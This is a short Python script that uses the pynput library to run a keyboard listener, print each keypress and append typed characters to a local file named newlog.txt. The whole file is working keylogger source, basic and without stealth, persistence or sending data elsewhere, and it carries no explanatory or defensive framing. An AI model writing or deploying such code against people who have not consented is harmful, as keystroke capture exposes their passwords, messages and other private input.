import pynput
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("newlog.txt", "a") as f:
        try:
            char = key.char
            f.write(char)
        except:
            print("ERROR GETTING CHARACTER")



if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
